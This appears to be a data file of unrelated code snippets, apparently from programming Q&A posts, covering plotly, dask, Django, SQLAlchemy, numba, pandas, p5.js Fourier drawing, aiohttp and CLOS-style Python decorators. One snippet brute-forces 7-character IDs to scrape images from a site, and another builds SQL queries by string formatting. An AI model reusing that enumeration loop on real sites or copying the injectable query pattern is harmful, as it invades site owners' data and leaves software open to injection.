' x ' : [ 0 , 1 , 2 ] , ' y ' : [ 0 , 0 , 0 ] } ) , Scatter ( { 'line ' : { 'color ' : 'rgb ( 128 , 0 , 0 ) ' , 'width ' : 1 } , ' x ' : [ 0 , 1 , 2 ] , ' y ' : [ 1 , 1 , 1 ] } ) ] ] The 'data ' property is a tuple of trace instances that may be specified as : - A list or tuple of trace instances ( e.g . [ Scatter ( ... ) , Bar ( ... ) ] ) - A single trace instance ( e.g . Scatter ( ... ) , Bar ( ... ) , etc . ) - A list or tuple of dicts of string/value properties where : - The 'type ' property specifies the trace type One of : [ 'area ' , 'bar ' , 'barpolar ' , 'box ' , 'candlestick ' , 'carpet ' , 'choropleth ' , 'choroplethmapbox ' , 'cone ' , 'contour ' , 'contourcarpet ' , 'densitymapbox ' , 'funnel ' , 'funnelarea ' , 'heatmap ' , 'heatmapgl ' , 'histogram ' , 'histogram2d ' , 'histogram2dcontour ' , 'image ' , 'indicator ' , 'isosurface ' , 'mesh3d ' , 'ohlc ' , 'parcats ' , 'parcoords ' , 'pie ' , 'pointcloud ' , 'sankey ' , 'scatter ' , 'scatter3d ' , 'scattercarpet ' , 'scattergeo ' , 'scattergl ' , 'scattermapbox ' , 'scatterpolar ' , 'scatterpolargl ' , 'scatterternary ' , 'splom ' , 'streamtube ' , 'sunburst ' , 'surface ' , 'table ' , 'treemap ' , 'violin ' , 'volume ' , 'waterfall ' ] - All remaining properties are passed to the constructor of the specified trace type ( e.g . [ { 'type ' : 'scatter ' , ... } , { 'type ' : 'bar , ... } ] ) fig = go.Figure ( data1 ) fig.show ( )"
assert dir ( ) == sorted ( locals ( ) .keys ( ) )
"if __name__ == '__main__ ' : archive = ArchiveFile ( ) script_path = path.realpath ( __file__ ) parent_dir = path.abspath ( path.join ( script_path , os.pardir ) ) targ_dir = path.join ( parent_dir , 'files ' ) targ_file = path.join ( targ_dir , 'test.zip ' ) archive.file = targ_file print ( archive.file_count ( ) ) def file_count ( self ) : `` '' '' Return the number of files in the archive . '' '' '' if self.file == None : return -1 with ZipFile ( self.file ) as zip : members = zip.namelist ( ) # Remove folder members if there are any . pruned = [ item for item in members if not item.endswith ( '/ ' ) ] return len ( pruned )"
"import dask.dataframe as ddimport pandas as pdimport psutil as psimport os # for easier vismb = 1048576def mytestfunc ( file ) : process = ps.Process ( os.getpid ( ) ) print ( 'initial memory : { 0 } '.format ( process.memory_info ( ) .rss/mb ) ) data = dd.read_csv ( file , compression = 'gzip ' , blocksize = None , storage_options = { 'anon ' : True } ) print ( 'dask plan memory : { 0 } '.format ( process.memory_info ( ) .rss/mb ) ) data = data.compute ( ) print ( 'data in memory : { 0 } '.format ( process.memory_info ( ) .rss/mb ) ) print ( 'data frame usage : { 0 } '.format ( data.memory_usage ( deep=True ) .sum ( ) /mb ) ) return dataprocess = ps.Process ( os.getpid ( ) ) print ( 'before function call : { 0 } '.format ( process.memory_info ( ) .rss/mb ) ) out = mytestfunc ( 's3 : //pandas-test/large_random.csv.gz ' ) print ( 'After function call : { 0 } '.format ( process.memory_info ( ) .rss/mb ) ) # out = mytestfunc ( 's3 : //pandas-test/tips.csv.gz ' ) # print ( 'After smaller function call : { 0 } '.format ( process.memory_info ( ) .rss/mb ) ) before function call : 76.984375initial memory : 76.984375dask plan memory : 92.9921875data in memory : 224.71484375data frame usage : 38.14704895019531After function call : 224.7265625 before function call : 70.69921875initial memory : 70.69921875dask plan memory : 80.16015625data in memory : 33991.69921875data frame usage : 10824.553115844727After function call : 33991.69921875"
"Date , Start , End2016-09-02 09:16:00 18 162016-09-02 16:14:10 16 12016-09-02 06:17:21 18 172016-09-02 05:51:07 23 172016-09-02 18:34:44 18 172016-09-02 05:44:44 20 42016-09-02 09:25:22 18 172016-09-02 22:27:44 18 172016-09-02 16:02:46 0 182016-09-02 15:35:07 17 172016-09-02 16:06:42 8 172016-09-02 14:47:04 16 232016-09-02 07:47:24 20 1 ... 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 0 2 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 3 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 4 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 5 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 6 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 7 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 8 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 9 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 010 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 011 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 012 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 013 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 014 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 015 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 016 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 017 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 4 , 0 , 0 , 0 , 0 , 118 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 019 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 020 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 021 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 022 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 023 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0"
"Exception Value : Error importing request processor module django.contrib.messages.context_processors.messagesdjango.core.context_processors : `` No module named 'django.contrib.messages.context_processors.messagesdjango ' ; django.contrib.messages.context_processors is not a package '' TEMPLATE_CONTEXT_PROCESSORS = ( `` django.contrib.auth.context_processors.auth '' , `` django.core.context_processors.debug '' , `` django.core.context_processors.i18n '' , `` django.core.context_processors.media '' , `` django.core.context_processors.static '' , `` django.core.context_processors.tz '' , `` django.contrib.messages.context_processors.messages '' `` django.core.context_processors.request '' , )"
"sqlalchemy_utils.functions.create_database ( ... ) # # ... # DeclBase = declarative_base ( ) # # ... class MyTable ( DeclBase ) : __tablename__ = 'my_table ' id = Column ( Integer , primary_key=True ) attr_1 = Column ( String ( 32 ) ) attr_2 = Column ( Integer , nullable=False ) attr_3 = Column ( DateTime ) attr_4 = Column ( Integer , ForeignKey ( 'other_table.id ' , onupdate='CASCADE ' , ondelete='CASCADE ' ) , nullable=False ) u_idx = UniqueConstraint ( attr_2 , attr_3 , 'my_table_uidx ' ) u_idx = UniqueConstraint ( attr_2 , attr_3 , 'my_table_uidx ' ) u_idx_1 = Index ( 'my_table_uidx ' , attr_2 , attr_3 , unique=True )"
"import pandas as pdimport numpy as npspecies = [ 'tiger ' , 'lion ' , 'mosquito ' , 'ladybug ' , 'locust ' , 'seal ' , 'seabass ' , 'shark ' , 'dolphin ' ] families = [ 'mammal ' , 'fish ' , 'insect ' ] lookupMap = { 'tiger ' : 'mammal ' , 'lion ' : 'mammal ' , 'mosquito ' : 'insect ' , 'ladybug ' : 'insect ' , 'locust ' : 'insect ' , 'seal ' : 'mammal ' , 'seabass ' : 'fish ' , 'shark ' : 'fish ' , 'dolphin ' : 'mammal ' } habitat_family = pd.DataFrame ( { 'id ' : range ( 1,11 ) , 'mammal ' : [ 101,123,523,562,546,213,562,234,987,901 ] , 'fish ' : [ 625,254,929,827,102,295,174,777,123,763 ] , 'insect ' : [ 345,928,183,645,113,942,689,539,789,814 ] } , index=range ( 1,11 ) , columns= [ 'id ' , 'mammal ' , 'fish ' , 'insect ' ] ) habitat_species = pd.DataFrame ( 0.0 , index=range ( 1,11 ) , columns=species ) # My highly inefficient solution : for id in habitat_family.index : # loop through habitat id 's for spec in species : # loop through species corresp_family = lookupMap [ spec ] habitat_species.loc [ id , spec ] = habitat_family.loc [ id , corresp_family ] habitat_species tiger lion mosquito ladybug locust seal seabass shark dolphin1 101 101 345 345 345 101 625 625 1012 123 123 928 928 928 123 254 254 1233 523 523 183 183 183 523 929 929 5234 562 562 645 645 645 562 827 827 5625 546 546 113 113 113 546 102 102 5466 213 213 942 942 942 213 295 295 2137 562 562 689 689 689 562 174 174 5628 234 234 539 539 539 234 777 777 2349 987 987 789 789 789 987 123 123 98710 901 901 814 814 814 901 763 763 901"
"_avg = { 'total':0.0 , 'count':0 } # HACK : side-effects stored heredef procedure ( n ) : _avg [ 'count ' ] += 1 _avg [ 'total ' ] += n return ndef get_average ( ) : return _avg [ 'total ' ] / _avg [ 'count ' ] my_dict = { 'key0 ' : procedure ( 0 ) , 'key2 ' : procedure ( 2 ) , 'key1 ' : get_average ( ) } assert ( my_dict [ 'key1 ' ] == 1.0 )"
"from numba import njit , prange @ njitdef dynamic_cumsum ( seq , index , max_value ) : cumsum = [ ] running = 0 for i in prange ( len ( seq ) ) : if running > max_value : cumsum.append ( [ index [ i ] , running ] ) running = 0 running += seq [ i ] cumsum.append ( [ index [ -1 ] , running ] ) return cumsum"
"// a + biclass Complex { constructor ( a , b ) { this.re = a ; this.im = b ; } add ( c ) { this.re += c.re ; this.im += c.im ; } mult ( c ) { const re = this.re * c.re - this.im * c.im ; const im = this.re * c.im + this.im * c.re ; return new Complex ( re , im ) ; } } function dft ( x ) { const X = [ ] ; const Values = [ ] ; const N = x.length ; for ( let k = 0 ; k < N ; k++ ) { let sum = new Complex ( 0 , 0 ) ; for ( let n = 0 ; n < N ; n++ ) { const phi = ( TWO_PI * k * n ) / N ; const c = new Complex ( cos ( phi ) , -sin ( phi ) ) ; sum.add ( x [ n ] .mult ( c ) ) ; } sum.re = sum.re / N ; sum.im = sum.im / N ; let freq = k ; let amp = sqrt ( sum.re * sum.re + sum.im * sum.im ) ; let phase = atan2 ( sum.im , sum.re ) ; X [ k ] = { re : sum.re , im : sum.im , freq , amp , phase } ; Values [ k ] = { phase } ; console.log ( Values [ k ] ) ; } return X ; } let x = [ ] ; let fourierX ; let time = 0 ; let path = [ ] ; function setup ( ) { createCanvas ( 800 , 600 ) ; const skip = 1 ; for ( let i = 0 ; i < drawing.length ; i += skip ) { const c = new Complex ( drawing [ i ] .x , drawing [ i ] .y ) ; x.push ( c ) ; } fourierX = dft ( x ) ; fourierX.sort ( ( a , b ) = > b.amp - a.amp ) ; } function epicycles ( x , y , rotation , fourier ) { for ( let i = 0 ; i < fourier.length ; i++ ) { let prevx = x ; let prevy = y ; let freq = fourier [ i ] .freq ; let radius = fourier [ i ] .amp ; let phase = fourier [ i ] .phase ; x += radius * cos ( freq * time + phase + rotation ) ; y += radius * sin ( freq * time + phase + rotation ) ; stroke ( 255 , 100 ) ; noFill ( ) ; ellipse ( prevx , prevy , radius * 2 ) ; stroke ( 255 ) ; line ( prevx , prevy , x , y ) ; } return createVector ( x , y ) ; } function draw ( ) { background ( 0 ) ; let v = epicycles ( width / 2 , height / 2 , 0 , fourierX ) ; path.unshift ( v ) ; beginShape ( ) ; noFill ( ) ; for ( let i = 0 ; i < path.length ; i++ ) { vertex ( path [ i ] .x , path [ i ] .y ) ; } endShape ( ) ; const dt = TWO_PI / fourierX.length ; time += dt ; let drawing = [ { y : -8.001009734 , x : -50 } , { y : -7.680969345 , x : -49 } , { y : -7.360928956 , x : -48 } , { y : -7.040888566 , x : -47 } , { y : -6.720848177 , x : -46 } , { y : -6.400807788 , x : -45 } , { y : -6.080767398 , x : -44 } , { y : -5.760727009 , x : -43 } , { y : -5.440686619 , x : -42 } , { y : -5.12064623 , x : -41 } , { y : -4.800605841 , x : -40 } , ... ... { y : -8.001009734 , x : -47 } , { y : -8.001009734 , x : -48 } , { y : -8.001009734 , x : -49 } , ] ;"
"import collectionscards = collections.namedtuple ( 'Card ' , [ 'rank ' , 'suit ' ] ) class Deck : ranks = [ str ( n ) for n in range ( 2,11 ) ] + list ( 'JQKA ' ) suits = 'spades diamonds hearts clubs'.split ( ) def __init__ ( self ) : self._cards = [ cards ( rank , suit ) for suit in self.suits for rank in self.ranks ] def __len__ ( self ) : return len ( self._cards ) def __getitem__ ( self , item ) : return self._cards [ item ] def __repr__ ( self ) : return ' % s of % s ' % ( ) # < -- do n't know how to assign the stringb = ( ) for i in b : print ( i )"
"canny_cracks = cv2.Canny ( gray , 100 , 200 ) contours , _ = cv2.findContours ( canny_cracks , cv2.RETR_EXTERNAL , cv2.CHAIN_APPROX_SIMPLE )"
"numbers = '0123456789'alnum = numbers + 'abcdefghijklmnopqrstuvwxyz'len7 = itertools.product ( numbers , alnum , alnum , alnum , alnum , alnum , alnum ) # length 7for p in itertools.chain ( len7 ) : currentid = `` .join ( p ) # semi static vars url = 'http : //mysite.com/images/ ' url += currentid # Need to get the real url cause the redirect print `` Trying `` + url req = urllib2.Request ( url ) res = openaurl ( req ) if res == `` continue '' : continue finalurl = res.geturl ( ) # ok we have the full url now time to if it is real try : file = urllib2.urlopen ( finalurl ) except urllib2.HTTPError , e : print e.code im = cStringIO.StringIO ( file.read ( ) ) img = Image.open ( im ) writeimage ( img )"
"from pybrain.tools.shortcuts import buildNetworknet = buildNetwork ( 2,3,1 )"
"hello = { 'test1 ' : [ 2,3,4,2,2,5,6 ] , 'test2 ' : [ 5,5,8,4,3,3,8,9 ] } hello = { 'test1 ' : [ 2,3,4,5,6 ] , 'test2 ' : [ 5,8,4,3,9 ] } for key , value in hello.items ( ) : goodbye = { key : set ( value ) } > > > goodbye { 'test2 ' : set ( [ 8 , 9 , 3 , 4 , 5 ] ) } > > > my_numbers = { } > > > my_numbers [ 'first ' ] = [ 1,2,2,2,6,5 ] > > > from collections import defaultdict > > > final_list = defaultdict ( set ) > > > for n in my_numbers [ 'first ' ] : final_list [ 'test_first ' ] .add ( n ) ... > > > final_list [ 'test_first ' ] set ( [ 1 , 2 , 5 , 6 ] )"
"class MyClass ( list ) : def __init__ ( self , **kwargs ) : if kwargs.has_key ( 'fdata ' ) : f = open ( kwargs [ 'fdata ' ] , ' r ' ) self = pickle.load ( f ) print len ( self ) # prints 320 f.close ( ) ... a = MyClass ( fdata='data.dat ' ) print len ( a ) # prints 0 3200"
"create_celebahq_cond_continuous ( '/content/drive/My Drive/kiki96/results/tfrecords ' , 'https : //drive.google.com/open ? id=0B7EVK8r0v71pWEZsZE9oNnFzTm8 ' , 'https : //drive.google.com/open ? id=0B4qLcYyJmiz0TXY1NG02bzZVRGs',4,100 , False )"
"CREATE TABLE messages ( id TEXT PRIMARY KEY ON CONFLICT REPLACE , date TEXT , hour INTEGER , sender TEXT , size INTEGER , origin TEXT , destination TEXT , relay TEXT , day TEXT ) ; 476793200A7|Jan 29 06:04:47|6|admin @ mydomain.com|4656|web02.mydomain.pvt|user @ example.com|mail01.mydomain.pvt|Jan 29 # ! /usr/bin/pythonprint 'Content-type : text/html\n\n'from datetime import dateimport rep = re.compile ( ' ( \w+ ) ( \d+ ) ' ) d_month = { 'Jan':1 , 'Feb':2 , 'Mar':3 , 'Apr':4 , 'May':5 , 'Jun':6 , 'Jul':7 , 'Aug':8 , 'Sep':9 , 'Oct':10 , 'Nov':11 , 'Dec':12 } l_wkday = [ 'Mo ' , 'Tu ' , 'We ' , 'Th ' , 'Fr ' , 'Sa ' , 'Su ' ] days = [ ] curs.execute ( 'SELECT DISTINCT ( day ) FROM messages ORDER BY day ' ) for day in curs.fetchall ( ) : m = p.match ( day [ 0 ] ) .group ( 1 ) m = d_month [ m ] d = p.match ( day [ 0 ] ) .group ( 2 ) days.append ( [ day [ 0 ] , '' % s ( % s ) '' % ( day [ 0 ] , l_wkday [ date.weekday ( date ( 2010 , int ( m ) , int ( d ) ) ) ] ) ] ) curs.execute ( 'SELECT DISTINCT ( sender ) FROM messages ' ) senders = curs.fetchall ( ) for sender in senders : curs.execute ( 'SELECT COUNT ( id ) FROM messages WHERE sender= % s ' , ( sender [ 0 ] ) ) print ' < div id= '' '+sender [ 0 ] + ' '' > ' print ' < h1 > Stats for Sender : '+sender [ 0 ] + ' < /h1 > ' print ' < table > < caption > Total messages in database : % d < /caption > ' % curs.fetchone ( ) [ 0 ] print ' < tr > < td > & nbsp ; < /td > < th colspan=24 > Hour of Day < /th > < /tr > ' print ' < tr > < td class= '' left '' > Day < /td > < th > % s < /th > < /tr > ' % ' < /th > < th > '.join ( map ( str , range ( 24 ) ) ) for day in days : print ' < tr > < td > % s < /td > ' % day [ 1 ] for hour in range ( 24 ) : sql = 'SELECT COUNT ( id ) FROM messages WHERE sender= '' % s '' AND day= '' % s '' AND hour= '' % s '' ' % ( sender [ 0 ] , day [ 0 ] , str ( hour ) ) curs.execute ( sql ) d = curs.fetchone ( ) [ 0 ] print ' < td > % s < /td > ' % ( d > 0 and str ( d ) or `` ) print ' < /tr > ' print ' < /table > < /div > 'print ' < /body > \n < /html > \n ' my % data ; my $ rows = $ db- > selectall_arrayref ( `` SELECT COUNT ( id ) , sender , day , hour FROM messages GROUP BY sender , day , hour ORDER BY sender , day , hour '' ) ; for my $ row ( @ $ rows ) { my ( $ ct , $ se , $ dy , $ hr ) = @ $ row ; $ data { $ se } { $ dy } { $ hr } = $ ct ; } for my $ se ( keys % data ) { print `` Sender : $ se\n '' ; for my $ dy ( keys % { $ data { $ se } } ) { print `` Day : `` , time2str ( ' % a ' , str2time ( `` $ dy 2010 '' ) ) , '' $ dy\n '' ; for my $ hr ( keys % { $ data { $ se } { $ dy } } ) { print `` Hour : $ hr = `` . $ data { $ se } { $ dy } { $ hr } . `` \n '' ; } } print `` \n '' ; }"
"self.mainWindow.filterTab.dirFilterPnl.Bind ( wx.EVT_BUTTON , self.onAdd_dirFilterPnl , self.mainWindow.filterTab.dirFilterPnl.addBtn , self.mainWindow.filterTab.dirFilterPnl.addBtn.GetId ( ) )"
"In [ 1 ] : A = arange ( 10*20*30*40 ) .reshape ( 10 , 20 , 30 , 40 ) In [ 2 ] : % timeit A.max ( ) 1000 loops , best of 3 : 216 us per loopIn [ 3 ] : % timeit A.sum ( ) 10000 loops , best of 3 : 119 us per loopIn [ 4 ] : % timeit A.any ( ) 1000 loops , best of 3 : 217 us per loop"
Status EventSUCCESS RunSUCCESS WalkSUCCESS RunFAILED Walk Event SUCCESS FAILEDRun 2 1Walk 0 1 grouped = df [ 'Status ' ] .groupby ( df [ 'Event ' ] )
"data = sqlContext.read.format ( `` com.databricks.spark.csv '' ) \ .option ( `` header '' , `` true '' ) \ .option ( `` inferSchema '' , `` true '' ) \ .load ( `` /FileStore/tables/w4s3yhez1497323663423/basma.csv/ '' ) data.cache ( ) # Cache data for faster reusedata.count ( ) from pyspark.mllib.regression import LabeledPoint # convenience for specifying schemadata = data.select ( `` creat0 '' , `` gfr0m '' ) .rdd.map ( lambda r : LabeledPoint ( r [ 1 ] , [ r [ 0 ] ] ) ) \ .toDF ( ) display ( data ) from pyspark.ml.feature import VectorAssemblervecAssembler = VectorAssembler ( inputCols= [ `` creat0 '' , `` gfr0m '' ] , outputCol= '' features '' ) ( trainingData , testData ) = data.randomSplit ( [ 0.7 , 0.3 ] , seed=100 ) trainingData.cache ( ) testData.cache ( ) print `` Training Data : `` , trainingData.count ( ) print `` Test Data : `` , testData.count ( ) data.collect ( ) from pyspark.ml.regression import LinearRegressionlr = LinearRegression ( ) # Fit 2 models , using different regularization parametersmodelA = lr.fit ( data , { lr.regParam : 0.0 } ) modelB = lr.fit ( data , { lr.regParam : 100.0 } ) # Make predictions predictionsA = modelA.transform ( data ) display ( predictionsA ) from pyspark.ml.evaluation import RegressionEvaluator evaluator = RegressionEvaluator ( metricName= '' rmse '' ) RMSE = evaluator.evaluate ( predictionsA ) print ( `` ModelA : Root Mean Squared Error = `` + str ( RMSE ) ) # ModelA : Root Mean Squared Error = 128.602026843 predictionsB = modelB.transform ( data ) RMSE = evaluator.evaluate ( predictionsB ) print ( `` ModelB : Root Mean Squared Error = `` + str ( RMSE ) ) # ModelB : Root Mean Squared Error = 129.496300193 # Import numpy , pandas , and ggplot import numpy as np from pandas import * from ggplot import * But its give me this error : from pyspark.mllib.linalg import Vectors , VectorUDT from pyspark.ml.linalg import VectorUDTfrom pyspark.sql.functions import udf as_ml = udf ( lambda v : v.asML ( ) if v is not None else None , VectorUDT ( ) ) from pyspark.mllib.linalg import Vectors as MLLibVectorsdf = sc.parallelize ( [ ( MLLibVectors.sparse ( 4 , [ 0 , 2 ] , [ 1 , -1 ] ) , ) , ( MLLibVectors.dense ( [ 1 , 2 , 3 , 4 ] ) , ) ] ) .toDF ( [ `` features '' ] ) result = df.withColumn ( `` features '' , as_ml ( `` features '' ) )"
"import numpy as npfrom numba import jitdt = 1e-5T = 1x0 = 1noiter = int ( T / dt ) res = np.zeros ( noiter ) def fdot ( x , t ) : return -x + t / ( x + 1 ) ** 2def solve_my_ODE ( res , fdot , x0 , T , dt ) : res [ 0 ] = x0 noiter = int ( T / dt ) for i in range ( noiter - 1 ) : res [ i + 1 ] = res [ i ] + dt * fdot ( res [ i ] , i * dt ) if res [ i + 1 ] > = 2 : res [ i + 1 ] -= 2 return res % timeit fdot ( x0 , T ) % timeit solve_my_ODE ( res , fdot , x0 , T , dt ) - > The slowest run took 8.38 times longer than the fastest . This could mean that an intermediate result is being cached - > 1000000 loops , best of 3 : 465 ns per loop - > 10 loops , best of 3 : 122 ms per loop @ jit ( nopython=True ) def fdot ( x , t ) : return -x + t / ( x + 1 ) ** 2 % timeit fdot ( x0 , T ) % timeit solve_my_ODE ( res , fdot , x0 , T , dt ) - > The slowest run took 106695.67 times longer than the fastest . This could mean that an intermediate result is being cached - > 1000000 loops , best of 3 : 240 ns per loop - > 10 loops , best of 3 : 99.3 ms per loop @ jit ( nopython=True ) def solve_my_ODE ( res , fdot , x0 , T , dt ) : res [ 0 ] = x0 noiter = int ( T / dt ) for i in range ( noiter - 1 ) : res [ i + 1 ] = res [ i ] + dt * fdot ( res [ i ] , i * dt ) if res [ i + 1 ] > = 2 : res [ i + 1 ] -= 2 return res % timeit fdot ( x0 , T ) % timeit solve_my_ODE ( res , fdot , x0 , T , dt ) - > The slowest run took 10.21 times longer than the fastest . This could mean that an intermediate result is being cached - > 1000000 loops , best of 3 : 274 ns per loop - > TypingError Traceback ( most recent call last ) ipython-input-10-27199e82c72c > in < module > ( ) 1 get_ipython ( ) .magic ( 'timeit fdot ( x0 , T ) ' ) -- -- > 2 get_ipython ( ) .magic ( 'timeit solve_my_ODE ( res , fdot , x0 , T , dt ) ' ) ( ... ) TypingError : Failed at nopython ( nopython frontend ) Undeclared pyobject ( float64 , float64 ) File `` < ipython-input-9-112bd04325a4 > '' , line 6"
if ( 3 < 4 == 2 < 3 ) { //3 < 4 == 2 < 3 will evaluate to true ... } 3 < 4 == 2 < 3 # this will evaluate to False in Python .
"import seaborn as snsimport numpy as npfig = self._view_frame.figuredata = np.loadtxt ( r'data.csv ' , delimiter= ' , ' ) ax = fig.add_subplot ( 111 ) ax.cla ( ) sns.kdeplot ( data , bw=10 , kernel='gau ' , cmap= '' Reds '' ) ax.scatter ( data [ : ,0 ] , data [ : ,1 ] , color= ' r ' ) fig.canvas.draw ( )"
"# -*- coding : utf-8 -*-from __future__ import absolute_import , division , unicode_literals , print_functionimport timefrom django import setupsetup ( ) from django.contrib.auth.models import Groupgroup = Group ( name='schön ' ) print ( type ( repr ( group ) ) ) print ( type ( str ( group ) ) ) print ( type ( unicode ( group ) ) ) print ( group ) print ( repr ( group ) ) print ( str ( group ) ) print ( unicode ( group ) ) time.sleep ( 1.0 ) print ( ' % s ' % group ) print ( ' % r ' % group ) # failsprint ( ' % s ' % [ group ] ) # failsprint ( ' % r ' % [ group ] ) # fails $ python .PyCharmCE2017.2/config/scratches/scratch.py < type 'str ' > < type 'str ' > < type 'unicode ' > schön < Group : schön > schönschönschönTraceback ( most recent call last ) : File `` /home/srkunze/.PyCharmCE2017.2/config/scratches/scratch.py '' , line 22 , in < module > print ( ' % r ' % group ) # failsUnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xc3 in position 11 : ordinal not in range ( 128 )"
"import pygamepygame.init ( ) screen = pygame.display.set_mode ( ( 400,400 ) ) joysticks = [ ] for i in range ( 0 , pygame.joystick.get_count ( ) ) : joysticks.append ( pygame.joystick.Joystick ( i ) ) joysticks [ -1 ] .init ( ) while True : for event in pygame.event.get ( ) : print event"
"def __init__ ( self ) : self.session = aiohttp.ClientSession ( ) async def get_u ( self , id ) : async with self.session.get ( 'url ' ) as resp : json_resp = await resp.json ( ) return json_resp.get ( 'data ' , { } ) await client.get_u ( 1 ) RuntimeError : Timeout context manager should be used inside a task async def get_u ( self , id ) : async with aiohttp.ClientSession ( ) as session : with async_timeout.timeout ( 3 ) : async with session.get ( 'url ' ) as resp : json_resp = await resp.json ( ) return json_resp.get ( 'data ' , { } ) import aiohttpfrom sanic.views import HTTPMethodViewclass Client : def __init__ ( self ) : self.session = aiohttp.ClientSession ( ) self.url = 'https : //jsonplaceholder.typicode.com/todos/1 ' async def get ( self ) : async with self.session.get ( self.url ) as resp : json_resp = await resp.json ( ) return json_respclient = Client ( ) class ExView ( HTTPMethodView ) : async def get ( self , request ) : todo = await client.get ( ) print ( todo )"
"( defmethod helloworld ( ) ( format t `` Hello World '' ) ) ( defmethod helloworld : before ( ) ( format t `` I 'm executing before the primary-method '' ) ) ( defmethod helloworld : after ( ) ( format t `` I 'm executing after the primary-method '' ) ) ( defmethod helloworld : around ( ) ( format t `` I 'm the most specific around method calling next method . '' ) ( call-next-method ) ( format t `` I 'm the most specific around method done calling next method . '' ) ) I 'm the most specific around method calling next method . I 'm executing before the primary-methodHello WorldI 'm executing after the primary-methodI 'm the most specific around method done calling next method . class shape with attributes position and method areaclass renderable with attribute visible and methods render , and render : aroundclass triangle with superclass shape and renderable attributes p1 , p2 , p3 and method render and method areaclass square ... `` 'file : cw.py '' ' '' 'This decorator does the job of implementing a CLOS method traversal through superclasses . It is a very remedial example but it helped me understand the power of decorators . ' '' ' '' Modified based on Richards comments '' 'def closwrapper ( func ) : # *args , **kwargs ? def wrapper ( self ) : # what about superclass traversals ? ? ? name = func.__name__ # look for the methods of the class before_func = getattr ( self , name + `` _before '' , None ) after_func = getattr ( self , name + `` _after '' , None ) around_func = getattr ( self , name + `` _around '' , None ) sup = super ( self.__class__ , self ) # self.__class__.__mro__ [ 1 ] if sup : # look for the supermethods of the class ( should be recursive ) super_before_func = getattr ( sup , name + `` _before '' , None ) super_after_func = getattr ( sup , name + `` _after '' , None ) ) super_around_func = getattr ( sup , name + `` _around '' , None ) ) `` ' This is the wrapper function which upgrades the primary method with any other methods that were found above '' ' `` ' The decorator looks up to the superclass for the functions . Unfortunately , even if the superclass is decorated , it does n't continue 